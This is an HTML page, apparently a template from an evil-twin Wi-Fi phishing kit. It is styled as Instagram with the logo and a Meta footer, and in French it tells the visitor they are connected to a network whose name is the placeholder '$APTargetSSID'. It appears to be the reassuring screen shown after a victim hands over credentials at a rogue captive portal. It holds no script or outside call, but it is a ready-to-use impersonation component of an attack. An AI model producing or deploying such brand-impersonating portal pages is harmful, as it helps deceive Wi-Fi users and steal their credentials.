<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#000000">
<meta name="robots" content="noindex">
<title>Instagram</title>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  html, body { height: 100%; background: #000; }
  body {
    margin: 0;
    color: #f5f5f5;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 32px 24px;
  }
  .card { width: 100%; max-width: 400px; text-align: center; }
  .glyph { width: 64px; height: 64px; margin: 0 auto 28px; display: block; }
  .check {
    width: 56px;
    height: 56px;
    margin: 0 auto 20px;
    border-radius: 50%;
    background: #12261a;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .check svg { width: 28px; height: 28px; }
  h1 { margin: 0 0 10px; font-size: 20px; font-weight: 600; }
  p { margin: 0 0 28px; font-size: 15px; line-height: 20px; color: #a8a8a8; }
  .ssid { color: #f5f5f5; font-weight: 600; }
  .btn {
    display: block;
    height: 48px;
    border-radius: 24px;
    background: #0095f6;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    line-height: 48px;
    text-decoration: none;
  }
  footer { margin-top: 36px; color: #8e8e8e; font-size: 12px; }
</style>
</head>
<body>
  <main class="card">
    <svg class="glyph" viewBox="0 0 24 24" fill="none" aria-label="Instagram" role="img">
      <defs>
        <linearGradient id="ig" x1="2" y1="2" x2="22" y2="22" gradientUnits="userSpaceOnUse">
          <stop offset="0" stop-color="#833AB4"/>
          <stop offset=".45" stop-color="#E1306C"/>
          <stop offset=".78" stop-color="#F77737"/>
          <stop offset="1" stop-color="#FCB045"/>
        </linearGradient>
      </defs>
      <rect x="2.15" y="2.15" width="19.7" height="19.7" rx="5.7" stroke="url(#ig)" stroke-width="1.9"/>
      <circle cx="12" cy="12" r="4.75" stroke="url(#ig)" stroke-width="1.9"/>
      <circle cx="17.45" cy="6.55" r="1.25" fill="url(#ig)"/>
    </svg>
    <div class="check">
      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path d="M4.5 12.5 9.5 17.5 19.5 7" stroke="#4ade80" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <h1>Vous êtes connecté</h1>
    <p>Cet appareil a maintenant accès à <span class="ssid">$APTargetSSID</span>.</p>
    <a class="btn" href="#">Continuer</a>
    <footer>Meta</footer>
  </main>
</body>
</html>
